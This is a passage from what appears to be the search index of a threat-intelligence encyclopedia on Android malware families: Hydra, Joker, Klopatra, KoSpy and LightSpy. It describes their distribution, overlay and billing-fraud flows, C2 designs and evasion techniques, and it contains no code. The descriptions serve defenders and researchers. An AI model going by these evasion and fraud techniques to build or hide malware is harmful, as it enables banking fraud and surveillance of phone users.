updated webinject marketplace integration"},{"location":"malware/families/hydra/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/hydra/#c2-communication","title":"C2 Communication","text":"<p>Hydra uses a layered C2 resolution approach that has evolved over time:</p> <p>TOR-based resolution: Recent variants include a hardcoded <code>.onion</code> URL pointing to <code>/api/mirrors</code>. The malware downloads TOR native libraries, connects to the TOR network, and retrieves a Base64-encoded JSON containing the active C2 server list. Cyble's analysis confirmed this TOR communication pattern.</p> <p>GitHub fallback: Some variants use a GitHub repository containing a Base64-encoded JSON object with C2 server addresses as an alternative to TOR resolution.</p> <p>DGA domains: Bridewell identified multiple DGA-generated domains used for fast-flux C2 infrastructure, providing redundancy and complicating takedowns. Their research identified 28 active C2 servers across a single campaign.</p> <p>Infrastructure location: NCC Group's research found that a significant number of C2 servers are hosted in the Netherlands, departing from the typical Russian/Chinese hosting patterns common in mobile malware.</p>"},{"location":"malware/families/hydra/#overlay-injection-flow","title":"Overlay Injection Flow","text":"<ol> <li>Bot registers with C2, sending device metadata and installed app list</li> <li>C2 responds with a target application list and a URL pointing to a ZIP file containing HTML overlay templates (injections)</li> <li>Bot monitors Accessibility events for targeted apps entering the foreground</li> <li>When a target is detected, the corresponding injection HTML is loaded in a WebView overlay</li> <li>Credentials entered into the overlay are exfiltrated to the C2</li> </ol> <p>The injection templates are sourced from underground marketplaces like \"InTheBox,\" where webinjects for specific banking apps are sold individually or in bundles.</p>"},{"location":"malware/families/hydra/#screen-streaming-and-remote-control","title":"Screen Streaming and Remote Control","text":"<p>Hydra's on-device fraud capability works through a two-channel system:</p> <ul> <li>Outbound: Device screen is captured via Android Screencast APIs and streamed to the C2</li> <li>Inbound: The operator sends interaction commands (tap coordinates, text input, swipe gestures) that Hydra translates into Accessibility actions on the device</li> </ul> <p>This creates a TeamViewer-like remote control session. Because the fraud occurs on the victim's device using their IP address and device fingerprint, it bypasses antifraud systems that rely on device/IP binding.</p>"},{"location":"malware/families/hydra/#persistence","title":"Persistence","text":"<p>Hydra requests Accessibility Service and Device Admin privileges. It suppresses notifications from security apps, disables Google Play Protect, and monitors for attempts to revoke its permissions, re-requesting them if removed.</p>"},{"location":"malware/families/hydra/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Hydra's affiliate model means targeting varies significantly by operator. Observed concentrations include:</p> Region Focus Turkey Historically the primary target region; Turkish banking apps consistently present in target lists Germany Bleeping Computer reported campaigns targeting Commerzbank (Germany's second-largest bank) Spain Bridewell documented a 2023 campaign focused on Spanish banking apps Latin America Same Bridewell research identified Latin American banking targets Broader Europe Austria, Italy, France, Netherlands, Poland, and other EU banking apps Cryptocurrency Wallet and exchange apps consistently present across affiliate target lists"},{"location":"malware/families/hydra/#notable-campaigns","title":"Notable Campaigns","text":"<p>2018-2019, BianLian dropper-as-a-service: ThreatFabric tracked BianLian's evolution from a simple dropper delivering Anubis payloads to a full-featured dropper service with its own banking trojan. The operators maintained persistent Google Play presence through rapid app replacement.</p> <p>2021, German banking campaign: Bleeping Computer reported a Hydra campaign specifically targeting Commerzbank customers, distributing a fake app that mimicked the bank's official Android application.</p> <p>2022, most prolific banking trojan: ThreatFabric's H1 2022 landscape report identified Hydra as the most active Android banking trojan by volume, surpassing FluBot (prior to its law enforcement takedown in May 2022), SharkBot, and TeaBot.</p> <p>Late 2022, European expansion with TOR C2: Cyble analyzed new Hydra variants incorporating TOR communication, SOCKS proxy, and Play Protect disabling. The campaign focused on European banking users with updated webinjects.</p> <p>January 2023, Spain and Latin America campaign: Bridewell identified a campaign distributing Hydra samples impersonating Google Chrome and Google Play Store. The research uncovered 28 C2 servers and DGA domain usage, with webinjects sourced from the InTheBox marketplace.</p> <p>February 2023, NCC Group technical deep-dive: NCC Group published a detailed technical analysis (also published via Fox-IT) covering Hydra's credential theft mechanisms, C2 infrastructure patterns, and overlay injection workflow.</p>"},{"location":"malware/families/hydra/#references","title":"References","text":""},{"location":"malware/families/joker/","title":"Joker (Bread)","text":"<p>Joker is the most persistent billing fraud family on Android, tracked internally by Google as \"Bread.\" Active since 2017, it has maintained a continuous presence on the Google Play Store through thousands of variants that cycle through evasion techniques faster than automated defenses can adapt. The family monetizes through WAP billing fraud, premium SMS subscriptions, and silent enrollment in paid services, generating revenue by charging victims through their phone bills.</p>"},{"location":"malware/families/joker/#overview","title":"Overview","text":"Attribute Details First Seen 2017 Status Active Type Billing fraud, premium SMS, subscription fraud Attribution Unknown, likely multiple independent operators Aliases Bread (Google), Joker, FaceStealer (some variants)"},{"location":"malware/families/joker/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Joker was first identified in the wild in 2017 and documented by Aleksejs Kuprins at CSIS Security Group in 2019 after discovery in 24 apps with over 472,000 combined installs. Google's Android Security team began tracking the family as \"Bread\" in early 2017 and published a detailed analysis in January 2020 revealing they had already removed over 1,700 infected apps from the Play Store. The family name \"Joker\" comes from one of the early C2 server domains.</p> <p>There is no single operator behind Joker. The low barrier to entry and high profitability of billing fraud means multiple independent threat actors build and submit Joker variants simultaneously. Google reported receiving up to 23 new Joker submissions in a single day during peak activity.</p>"},{"location":"malware/families/joker/#distribution","title":"Distribution","text":"<p>Joker distributes exclusively through the Google Play Store. The entire operational model depends on getting past Play Protect and app review. Distribution tactics include:</p> Tactic Description Functional wrapper apps Malicious code injected into legitimate utility apps (QR scanners, wallpaper apps, PDF tools, messaging apps) Versioning Upload a clean app, build user base, push malicious update Minimal initial payload First submission contains only a dropper; malicious payload downloaded from C2 post-install Category rotation Shift between app categories to avoid pattern detection Developer account cycling Burn and replace developer accounts when banned <p>Typical app categories abused: camera utilities, wallpapers, emoji keyboards, messaging clients, health trackers, PDF readers, and translation tools.</p>"},{"location":"malware/families/joker/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/joker/#fraud-mechanisms","title":"Fraud Mechanisms","text":"Mechanism Description WAP billing Connects to premium service payment pages over the device's mobile data connection; charges appear on phone bill Premium SMS Sends SMS to premium-rate short codes Subscription fraud Opens invisible WebViews to subscription pages, auto-fills phone number, intercepts confirmation OTP via SMS <p>WAP billing is the primary revenue source. The malware forces the device onto mobile data (disabling Wi-Fi if needed), navigates to carrier billing pages, and completes the subscription flow programmatically. After Google restricted <code>SEND_SMS</code> permissions in 2019, the family shifted almost entirely from premium SMS to WAP/toll fraud. Kaspersky published a detailed comparison of subscription trojans covering Joker alongside MobOk, Vesub, and GriftHorse, documenting the WAP billing abuse and SMS interception techniques each family uses.</p>"},{"location":"malware/families/joker/#evasion-evolution","title":"Evasion Evolution","text":"<p>Joker's defining characteristic is the speed at which it iterates evasion techniques. Google's 2020 blog post describes this as an arms race. Zscaler ThreatLabz and Trend Micro have published analyses tracking this progression:</p> Era Technique Details 2017-2018 Direct SMS fraud Called SMS APIs directly; detected quickly after Google tightened <code>SEND_SMS</code> policy 2018-2019 String encryption AES, Blowfish, DES, and combinations to hide C2 addresses and payload URLs from static scanners 2019 Java reflection Used <code>Reflect</code> API on decrypted strings at runtime to hide API calls from static analysis 2019-2020 Native code Moved core logic to <code>.so</code> libraries; harder for bytecode-level scanners to inspect 2020 Versioning Submitted clean apps, pushed malicious payloads in updates 2020-2021 Commercial packers Used Qihoo360, AliProtect, SecShell to wrap payloads 2021 GitHub payload hosting Stored payloads on GitHub Pages to avoid domain blocklists 2021-2022 URL shortener chains Used TinyURL, bit.ly, Rebrand.ly, zws.im to mask payload URLs from known-bad domain lists 2022+ Multi-stage droppers Play Store app contains only loader; fetches encrypted intermediate payload; intermediate fetches final payload"},{"location":"malware/families/joker/#payload-obfuscation","title":"Payload Obfuscation","text":"<p>Encryption across Joker variants is not standardized. Zscaler documented the following approaches across different variants:</p> Method Usage AES + Base64 Most common string encryption; each class may use a different key XOR Basic payload encryption in early variants Nested XOR Multiple XOR rounds with different keys DES / Blowfish Less common but observed in specific campaigns Custom key derivation Per-class or per-method keys generated at runtime Asset file disguise Payloads hidden as <code>.json</code>, <code>.ttf</code>, <code>.png</code>, or <code>.db</code> files in the assets directory"},{"location":"malware/families/joker/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/joker/#infection-flow","title":"Infection Flow","text":"<pre><code>Play Store App (clean-looking utility)\n    \u2192 attachBaseContext() loads dropper component\n    \u2192 Dropper decrypts embedded or downloaded stage-2 payload\n    \u2192 Stage-2 contacts C2 for configuration (target country, carrier, subscription URLs)\n    \u2192 Checks MCC (Mobile Country Code) against target list\n    \u2192 If match: disables Wi-Fi, forces mobile data\n    \u2192 Opens WAP billing page in invisible WebView\n    \u2192 Injects JavaScript to auto-fill phone number and confirm subscription\n    \u2192 Intercepts SMS confirmation code via NotificationListenerService or BroadcastReceiver\n    \u2192 Submits OTP to complete enrollment\n    \u2192 Deletes confirmation SMS\n</code></pre>"},{"location":"malware/families/joker/#c2-communication","title":"C2 Communication","text":"<p>C2 addresses are hidden using the techniques described in the evasion table. Common patterns include:</p> <ul> <li>Encrypted strings in <code>strings.xml</code> or class constants, decrypted at runtime</li> <li>C2 URLs split across multiple string variables, concatenated at runtime (e.g., the string \"sticker\" inserted as a delimiter between URL fragments)</li> <li>Cloud storage services (Firebase, GitHub) used as intermediate payload hosts</li> <li>Some variants use no persistent C2: the entire configuration is baked into the downloaded payload</li> </ul>"},{"location":"malware/families/joker/#country-targeting","title":"Country Targeting","text":"<p>Joker variants typically embed a list of target Mobile Country Codes (MCC). If the device SIM does not match a targeted country, the malware does not activate. This selective targeting reduces exposure and helps avoid detection in regions where researchers are more active. Common target regions include Southeast Asia, the Middle East, and Western Europe.</p>"},{"location":"malware/families/joker/#target-regions","title":"Target Regions","text":"<p>Joker targets countries where WAP billing and premium SMS services are active and profitable. Primary targets have included:</p> Region Countries Europe UK, Germany, France, Spain, Italy, Netherlands Asia India, Thailand, Malaysia, Indonesia, China Middle East Saudi Arabia, UAE, Kuwait Americas Brazil, Argentina Oceania Australia <p>Coverage varies by variant. Operators select targets based on which carriers have exploitable billing flows.</p>"},{"location":"malware/families/joker/#notable-campaigns","title":"Notable Campaigns","text":"<p>2019, September: CSIS researcher Aleksejs Kuprins publishes initial analysis identifying Joker in 24 Google Play apps with 472,000+ downloads. Documents SMS theft, contact exfiltration, and premium service enrollment.</p> <p>2020, January: Google publishes \"PHA Family Highlights: Bread (and Friends)\", revealing 1,700+ apps removed since 2017 and describing the ongoing cat-and-mouse with Bread operators.</p> <p>2020, July: Check Point Research identifies a new variant using the old technique of hiding payloads inside the Android Manifest file, evading updated Play Protect signatures.</p> <p>2020, September: Google removes 17 Joker-infected apps with 120,000+ combined downloads after detection by Zscaler ThreatLabz.</p> <p>2020, November: Trend Micro documents Joker variants using GitHub and GitHub Pages to host payloads, a technique not previously observed in the family.</p> <p>2021, June: Zscaler finds additional Joker apps on Google Play using URL shortener chains and multi-layer encryption to hide payload delivery.</p> <p>2022, July: Pradeo identifies Joker variants with over 100,000 installs, confirming the family's continued Play Store presence five years after initial discovery.</p> <p>2022, August: Zscaler reports Joker alongside Facestealer and Coper in a batch of malicious Google Play apps, showing the family remains part of the active Play Store threat landscape.</p>"},{"location":"malware/families/joker/#references","title":"References","text":""},{"location":"malware/families/klopatra/","title":"Klopatra","text":"<p>Klopatra is a sophisticated Android banking trojan discovered by Cleafy in August 2025, operated by a Turkish-origin threat actor managing the full attack chain from development to fraud execution. The malware combines hidden VNC for remote device control with dynamic overlay attacks. It is notably protected by Virbox, a commercial Chinese packer rarely seen in Android malware, and has shifted core functionality from Java to native libraries. At the time of discovery, operators had compromised over 3,000 devices across two botnets targeting Spain and Italy.</p>"},{"location":"malware/families/klopatra/#overview","title":"Overview","text":"Attribute Details First Seen August 2025 Status Active Type Banking trojan, device takeover Attribution Turkish-origin threat actor Distribution Fake \"Mobdro Pro IP TV + VPN\" app Protection Virbox commercial packer"},{"location":"malware/families/klopatra/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cleafy's analysis traces Klopatra's operations to a Turkish-origin threat actor who manages the full attack chain. The family appears to be an independently developed project without direct code lineage to known banking trojan families.</p> <p>The attribution to Turkish-speaking actors places Klopatra alongside Frogblight, another Turkish banking trojan discovered in 2025 with possible connections to the Coper/Exobot ecosystem. While no direct code relationship between Klopatra and Frogblight has been established, both represent active Turkish-origin threats emerging in the same timeframe with distinct technical approaches: Frogblight uses custom keyboard keylogging while Klopatra relies on hidden VNC and native code.</p>"},{"location":"malware/families/klopatra/#distribution","title":"Distribution","text":"Vector Details Fake application \"Mobdro Pro IP TV + VPN\" impersonating the defunct Mobdro streaming app Sideloading Distributed outside the official Google Play Store <p>Cleafy documented the use of a fake \"Mobdro Pro IP TV + VPN\" application as the delivery vehicle. Mobdro was a popular free streaming application that was shut down, making it an effective lure since users searching for the app would encounter the malicious version.</p>"},{"location":"malware/families/klopatra/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/klopatra/#core-features","title":"Core Features","text":"Capability Implementation Hidden VNC Remote device control invisible to the victim Dynamic overlay attacks Phishing overlays injected over target banking apps Native library execution Core functionality shifted from Java to native code Screen blackout Device screen manipulation during remote fraud operations Nighttime operation Operators prefer attacking while victims sleep with phones charging"},{"location":"malware/families/klopatra/#hidden-vnc","title":"Hidden VNC","text":"<p>Klopatra implements hidden VNC (Virtual Network Computing) for remote device control, allowing operators to interact with the infected device in real time. Unlike screen streaming approaches used by families like Octo (which streams screenshots at 1 frame per second), VNC provides a more responsive remote session. The VNC implementation is hidden from the victim, with no visible indicators of the remote session.</p>"},{"location":"malware/families/klopatra/#dynamic-overlay-attacks","title":"Dynamic Overlay Attacks","text":"<p>The overlay attack capability dynamically injects phishing pages over target banking applications. When the victim opens a banking app, Klopatra detects the foreground application and displays a convincing phishing overlay to capture credentials. The dynamic nature means overlay content is served from C2 infrastructure rather than bundled in the APK, allowing operators to update and add new targets without rebuilding the malware.</p>"},{"location":"malware/families/klopatra/#nighttime-attack-pattern","title":"Nighttime Attack Pattern","text":"<p>Cleafy noted a distinctive operational preference: Klopatra operators favor conducting fraud during nighttime hours when victims are sleeping and their phones are charging. This timing is strategic for several reasons:</p> <ul> <li>The victim is unlikely to notice screen activity or device manipulation</li> <li>The device is connected to power, ensuring it stays operational during extended fraud sessions</li> <li>Banking app session timeouts are the only constraint on the operation window</li> <li>Notifications generated during fraud are less likely to be seen immediately</li> </ul>"},{"location":"malware/families/klopatra/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/klopatra/#native-code-migration","title":"Native Code Migration","text":"<p>Klopatra has shifted core functionality from Java to native libraries, a significant anti-analysis measure. Cleafy's analysis documented this architectural choice:</p> <ul> <li>Critical logic executes in compiled native code (C/C++) rather than Dalvik bytecode</li> <li>Native libraries are harder to decompile and analyze compared to Java/Kotlin code</li> <li>This raises the barrier for security researchers performing static analysis</li> <li>Dynamic analysis tools that hook Java methods may miss native function calls</li> </ul>"},{"location":"malware/families/klopatra/#virbox-packer","title":"Virbox Packer","text":"<p>Klopatra is protected by Virbox, a commercial Chinese software protection tool. Virbox is widely used for legitimate software protection but is rarely encountered in Android malware:</p> <ul> <li>Virbox applies code virtualization and encryption to the APK</li> <li>The packer complicates static analysis by obfuscating the application's code</li> <li>Its rarity in the Android malware ecosystem means security tools may have less robust unpacking support compared to commonly abused packers</li> <li>The choice of a commercial packer rather than custom obfuscation suggests the operators prioritize reliable protection over operational security of the development toolchain</li> </ul>"},{"location":"malware/families/klopatra/#c2-infrastructure","title":"C2 Infrastructure","text":"<p>Specific C2 protocol details were documented by Cleafy's research. The infrastructure supports real-time VNC sessions and dynamic overlay delivery, requiring persistent connectivity between the infected device and the operator's panel.</p>"},{"location":"malware/families/klopatra/#two-botnet-architecture","title":"Two-Botnet Architecture","text":"<p>Cleafy identified two separate botnets operated by the same threat actor:</p> Botnet Target Region Compromised Devices Botnet 1 Spain Part of 3,000+ total Botnet 2 Italy Part of 3,000+ total <p>The separation into regional botnets allows operators to maintain distinct overlay kits, C2 configurations, and operational schedules tuned to each target country.</p>"},{"location":"malware/families/klopatra/#target-regions","title":"Target Regions","text":"Region Status Details Spain Primary target Dedicated botnet Italy Primary target Dedicated botnet <p>Cleafy's report documents Spain and Italy as the two target regions, each served by a separate botnet. With over 3,000 compromised devices across both botnets, Klopatra represents a focused but sizable operation.</p>"},{"location":"malware/families/klopatra/#notable-campaigns","title":"Notable Campaigns","text":"<p>August 2025: Cleafy publishes their discovery of Klopatra, documenting a Turkish-origin banking trojan with hidden VNC, dynamic overlays, and Virbox packer protection. Over 3,000 devices are already compromised across two botnets targeting Spain and Italy. The operators' preference for nighttime attacks is identified as a distinctive operational pattern.</p>"},{"location":"malware/families/klopatra/#related-families","title":"Related Families","text":"<p>Klopatra's combination of hidden VNC and overlay attacks places it in the same capability tier as Hook, which offers VNC-based remote access alongside its Cerberus-derived banking trojan features. Vultur similarly uses screen streaming (via AlphaVNC) for device takeover. The native code migration pattern is shared with the latest versions of Medusa, which also moved critical components to native libraries in its v2 rewrite.</p> <p>The Turkish attribution connects Klopatra to a broader trend of Turkish-origin Android malware, alongside Frogblight and the Turkish-speaking operator groups behind Medusa. Each takes a different technical approach, but all target European banking customers.</p> <p>The use of the Virbox commercial packer is a distinctive choice that sets Klopatra apart from most Android banking trojans, which typically use custom packers or open-source obfuscation tools.</p>"},{"location":"malware/families/klopatra/#references","title":"References","text":""},{"location":"malware/families/kospy/","title":"KoSpy","text":"<p>KoSpy is an Android spyware platform discovered by Lookout Threat Intelligence in March 2025, attributed with medium confidence to the North Korean state-sponsored group ScarCruft (APT37). The spyware was distributed through Google Play and third-party app stores disguised as utility applications such as \"File Manager,\" \"Phone Manager,\" and \"Kakao Security,\" targeting Korean and English-speaking users. KoSpy uses a two-stage C2 architecture: Firebase Firestore provides initial configuration (an activation switch and C2 address), while the actual C2 server delivers dynamically loaded plugins for surveillance functions including SMS collection, call log harvesting, location tracking, file exfiltration, audio recording, screenshot capture, and keylogging. Lookout identified infrastructure overlaps with APT43 (Kimsuky), suggesting shared resources between North Korean cyber operations.</p>"},{"location":"malware/families/kospy/#overview","title":"Overview","text":"Attribute Details First Seen March 2022 (earliest samples) Status Active as of March 2025; removed from Google Play Type Spyware, surveillance tool Aliases None known Attribution ScarCruft (APT37 / Reaper / Ricochet Chollima), with infrastructure links to APT43 (Kimsuky) Distribution Google Play Store, third-party app stores, fake utility applications"},{"location":"malware/families/kospy/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Lookout published their analysis in March 2025, identifying KoSpy as a previously undocumented Android surveillance tool with samples dating back to March 2022. The three-year operational window before public disclosure indicates sustained, low-profile deployment characteristic of state-sponsored intelligence collection rather than financially motivated campaigns.</p> <p>ScarCruft (also tracked as APT37 and Reaper) has been active since at least 2012 as a North Korean state-sponsored cyber espionage group. The group has historically focused on South Korean targets, including government officials, defectors, journalists, and human rights activists. KoSpy represents their known Android surveillance capability, extending collection beyond traditional desktop and browser-based operations.</p> <p>Lookout identified infrastructure overlaps between KoSpy's campaign and operations previously attributed to APT43 (Kimsuky), another North Korean state-sponsored group. This overlap suggests either shared infrastructure resources between DPRK cyber units or coordinated operations, consistent with broader intelligence assessments of North Korean cyber operations where multiple groups share tooling and infrastructure.</p>"},{"location":"malware/families/kospy/#distribution","title":"Distribution","text":"Vector Details Google Play Store Uploaded as utility apps; since removed by Google Third-party app stores Fake utility applications hosted on alternative marketplaces <p>KoSpy masquerades as five different utility applications:</p> <ol> <li>File Manager</li> <li>Phone Manager (Korean: \ud734\ub300\ud3f0 \uad00\ub9ac\uc790)</li> <li>Smart Manager (Korean: \uc2a4\ub9c8\ud2b8 \uad00\ub9ac\uc790)</li> <li>Kakao Security (Korean: \uce74\uce74\uc624 \ubcf4\uc548)</li> <li>Software Update Utility</li> </ol> <p>The choice of app names is calculated. File managers and system utilities are apps users expect to request broad permissions (storage, contacts, SMS), making the permission requests less suspicious. The \"Kakao Security\" lure specifically targets Korean users by impersonating a security tool for KakaoTalk, South Korea's dominant messaging platform. The Korean-language app names alongside English-language variants confirm dual targeting of Korean-speaking and English-speaking populations.</p> <p>Google has since removed all identified KoSpy applications from the Play Store and deactivated the associated Firebase projects used for C2 configuration delivery.</p>"},{"location":"malware/families/kospy/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/kospy/#core-features","title":"Core Features","text":"Capability Implementation SMS collection Harvests all SMS messages from the device Call log harvesting Extracts call history with numbers, timestamps, and durations Location tracking Collects GPS coordinates and location data File exfiltration Accesses and uploads files from local storage Audio recording Records ambient audio via device microphone Screenshot capture Takes screenshots of the current display Keylogging Captures keystrokes across applications Camera capture Photographs using device cameras WiFi network data Collects information about connected WiFi networks and nearby devices Installed app inventory Enumerates all applications installed on the device"},{"location":"malware/families/kospy/#plugin-based-surveillance","title":"Plugin-Based Surveillance","text":"<p>KoSpy's surveillance capabilities are delivered through dynamically loaded plugins rather than being statically compiled into the application. After retrieving its C2 address from Firebase Firestore, KoSpy sends two types of requests to the C2 server: one downloads executable plugins, the other retrieves configuration parameters for each surveillance function. This modular design allows operators to selectively enable or disable specific collection capabilities per target, update surveillance modules without pushing new app versions, and add new collection capabilities to deployed implants without reinfection.</p>"},{"location":"malware/families/kospy/#data-exfiltration","title":"Data Exfiltration","text":"<p>Collected data is encrypted with a hardcoded AES key before transmission to C2 servers. While a hardcoded key simplifies decryption for anyone with access to the malware sample, it ensures data in transit is not trivially readable by network monitoring tools, providing a baseline of operational security for the exfiltration channel.</p>"},{"location":"malware/families/kospy/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/kospy/#two-stage-c2-architecture","title":"Two-Stage C2 Architecture","text":"<p>KoSpy's most notable technical feature is its use of Google's Firebase Firestore as a first-stage configuration delivery mechanism. On initial execution, the spyware queries a Firebase Firestore database to retrieve a simple configuration containing two parameters:</p> <ol> <li>An activation switch (\"on\" or \"off\")</li> <li>The actual C2 server address</li> </ol> <p>This architecture provides significant operational advantages. Firebase Firestore is a legitimate Google service, so traffic to it blends with normal app behavior and is unlikely to be flagged by network monitoring. The activation switch allows operators to keep implants dormant until they are ready to begin collection on a specific target. The C2 address can be rotated at any time through the Firestore database without touching the implant, providing resilience against C2 takedowns. Lookout identified five distinct Firebase projects and five C2 servers across the analyzed sample set.</p>"},{"location":"malware/families/kospy/#anti-analysis-checks","title":"Anti-Analysis Checks","text":"<p>Before activating surveillance functions, KoSpy performs two validation checks:</p> <ol> <li>Emulator detection to avoid executing in analysis sandboxes</li> <li>Date comparison against a hardcoded activation date to prevent premature exposure of capabilities</li> </ol> <p>These checks ensure the spyware does not reveal its malicious behavior to security researchers running samples in emulated environments or analyzing recently compiled builds before their intended deployment date.</p>"},{"location":"malware/families/kospy/#http-post-exfiltration","title":"HTTP POST Exfiltration","text":"<p>After passing validation checks and retrieving the C2 address from Firebase, KoSpy communicates with its C2 server via HTTP POST requests. Plugin downloads and configuration updates flow through this channel, as does exfiltrated surveillance data after AES encryption.</p>"},{"location":"malware/families/kospy/#target-regions","title":"Target Regions","text":"Period Primary Targets March 2022 onward Korean-speaking users (South Korea), English-speaking users <p>The dual-language targeting (Korean app names alongside English variants) indicates collection against both South Korean targets and English-speaking populations of interest to DPRK intelligence. The \"Kakao Security\" lure specifically targets South Korean users who use KakaoTalk, while \"File Manager\" and \"Software Update Utility\" serve as language-neutral lures applicable to any English-speaking target.</p>"},{"location":"malware/families/kospy/#notable-campaigns","title":"Notable Campaigns","text":"<p>March 2022 to March 2025: Lookout documented a sustained KoSpy campaign spanning approximately three years. The spyware operated through Google Play and third-party app stores using five fake utility application identities. The campaign leveraged Firebase Firestore for resilient C2 configuration delivery and dynamically loaded plugins for modular surveillance. Lookout attributed the operation to ScarCruft (APT37) with medium confidence based on infrastructure analysis, and identified shared infrastructure with APT43 (Kimsuky) operations. Google removed all identified apps and deactivated the associated Firebase projects following disclosure.</p>"},{"location":"malware/families/kospy/#related-families","title":"Related Families","text":"Family Relationship Hermit Both are state-sponsored Android spyware platforms with modular plugin architectures for surveillance. Hermit is attributed to Italian vendor RCS Lab, while KoSpy serves North Korean intelligence. SpyNote Both provide comprehensive Android surveillance (SMS, calls, location, audio, camera, keylogging), though SpyNote is a commodity RAT builder while KoSpy is a targeted state-sponsored tool with Firebase-based C2 configuration. Pegasus Both represent state-sponsored mobile surveillance, though Pegasus (NSO Group) exploits zero-day vulnerabilities for zero-click deployment while KoSpy relies on social engineering through fake utility apps."},{"location":"malware/families/kospy/#references","title":"References","text":""},{"location":"malware/families/lightspy/","title":"LightSpy","text":"<p>LightSpy is a modular surveillance framework targeting iOS, Android, macOS, Windows, Linux, and routers, with a persistent focus on the Asia-Pacific region. First documented in early 2020 during watering hole attacks against Hong Kong users, the framework is attributed with high confidence to Chinese state-sponsored operations overlapping with APT41. On Android, LightSpy operates through a plugin-based architecture where a lightweight Core orchestrator downloads and manages 14+ surveillance plugins covering location tracking, messaging app data extraction, payment system monitoring, ambient audio recording, and file exfiltration. ThreatFabric linked the Android variant (previously tracked as DragonEgg) to the same infrastructure as the iOS implant, unifying what had been treated as separate campaigns. As of early 2025, Hunt.io documented over 100 commands across all platforms, with new capabilities targeting Facebook and Instagram data on Android.</p>"},{"location":"malware/families/lightspy/#overview","title":"Overview","text":"Attribute Details First Seen January 2020 (watering hole discovery) Status Active, continuously expanding Type State-sponsored surveillance framework Attribution Chinese state-sponsored, APT41 overlap (Lookout, BlackBerry); earlier research linked to Spring Dragon/Lotus Blossom Aliases DragonEgg (Android variant, per Lookout), LightSpy mAPT Platforms Android, iOS, macOS, Windows, Linux, routers"},{"location":"malware/families/lightspy/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Kaspersky and Trend Micro jointly disclosed LightSpy in March 2020, documenting a watering hole attack that delivered a full iOS exploit chain to visitors of a fake news site mimicking Hong Kong's Apple Daily newspaper. The campaign began on January 10, 2020 and escalated on February 18 with iframe-based redirects serving both the exploit payload and the legitimate news site to avoid suspicion.</p> <p>In July 2023, Lookout published research on two Android surveillance tools they named WyrmSpy and DragonEgg, attributing both to APT41. ThreatFabric subsequently established that DragonEgg's Core module was the Android component of the LightSpy framework, sharing infrastructure and C2 patterns with the iOS implant documented in 2020. WyrmSpy (also called AndroidControl) shared the same infrastructure and may represent a successor variant.</p> <p>BlackBerry's November 2024 analysis documented the DeepData framework deployed alongside LightSpy in targeted espionage campaigns across Southern Asia, reinforcing the APT41 attribution and revealing expanded operational scope.</p>"},{"location":"malware/families/lightspy/#distribution","title":"Distribution","text":"Vector Details Watering hole attacks Fake news sites mimicking legitimate media (Apple Daily clone targeting Hong Kong, 2020) Safari/WebKit exploit chain CVE-2020-9802 (WebKit RCE), CVE-2020-3837 (privilege escalation) for iOS delivery Trojanized applications Android delivery via fake utility apps and messaging apps distributed outside official stores iframe redirect chains Invisible iframes redirecting to exploit servers while loading legitimate content <p>The iOS watering hole campaign used a multi-stage exploit chain: visitors to the lure site were redirected through an invisible iframe to an exploit server that triggered CVE-2020-9802 (a WebKit vulnerability fixed in iOS 13.5) for initial code execution, with CVE-2020-9870 and CVE-2020-9910 (fixed in iOS 13.6) used as mitigation bypasses, and CVE-2020-3837 for privilege escalation to install the implant.</p> <p>Android distribution relies on trojanized applications rather than browser exploits. Targets are directed to download apps that appear legitimate but contain the LightSpy Core loader, which then fetches plugins from C2.</p>"},{"location":"malware/families/lightspy/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/lightspy/#android-plugin-architecture","title":"Android Plugin Architecture","text":"<p>LightSpy's Android variant operates through a Core orchestrator that manages surveillance plugins. ThreatFabric obtained the Core and 14 plugins from 20 active C2 servers. The Core creates a SQLite database named <code>light2.db</code> to store configuration, commands, and plugin data. Plugins are downloaded via WebSocket, while HTTPS handles data exfiltration.</p> Plugin Function <code>locationmodule</code> GPS tracking with precision down to building floor number <code>locationBaidu</code> Location tracking via Baidu services (China-focused) <code>soundrecord</code> Ambient audio recording and WeChat VOIP call interception <code>cameramodule</code> Silent photo capture from device cameras <code>wechat</code> WeChat message history, contacts, and group data extraction <code>bill</code> WeChat Pay transaction and payment history collection <code>qq</code> QQ messenger data extraction <code>telegram</code> Telegram message and contact exfiltration <code>softchat</code> / <code>softlist</code> Installed application enumeration and messaging app data <code>chatfile</code> File extraction from messaging app storage directories <code>filemanager</code> General file system browsing and exfiltration <code>browser</code> Browser history, bookmarks, and saved data <code>shell</code> Remote shell command execution <code>baseinfo</code> Device fingerprinting (IMEI, model, OS version, SIM info) <code>wifi</code> WiFi network enumeration, connected network details, local network scanning"},{"location":"malware/families/lightspy/#expanded-capabilities-2024-2025","title":"Expanded Capabilities (2024-2025)","text":"<p>Hunt.io documented newer versions with expanded social media targeting:</p> Capability Details Facebook data extraction Database file extraction from the Facebook Android app Instagram data extraction Message and account metadata collection from Instagram 100+ commands Cross-platform command set spanning Android, iOS, macOS, Windows, Linux, and routers Plugin version tracking Centralized management of plugin updates across deployed implants Transmission management Operator control over data exfiltration scheduling and bandwidth"},{"location":"malware/families/lightspy/#ios-capabilities","title":"iOS Capabilities","text":"<p>The iOS implant mirrors the Android plugin set with platform-specific adaptations:</p> Category Details Messages SMS, iMessage, email Messaging apps WeChat, QQ, Telegram, WhatsApp Location GPS with fine-grained positioning Calls Call history extraction Contacts Full address book exfiltration WiFi Network enumeration and connected AP details Browser Safari history and bookmarks Keychain iOS Keychain data extraction"},{"location":"malware/families/lightspy/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/lightspy/#core-architecture","title":"Core Architecture","text":"<p>The LightSpy Core operates as a plugin itself, responsible for orchestrating all functions in the attack chain. It exports a C2 communication function that individual plugins call to exfiltrate collected data. The Core is highly configurable through updatable operator-defined settings, allowing precise control over what data is collected and when.</p> <p>On first execution, the Core:</p> <ol> <li>Creates the <code>light2.db</code> SQLite database for local state management</li> <li>Registers with the C2 server, sending device fingerprint and plugin 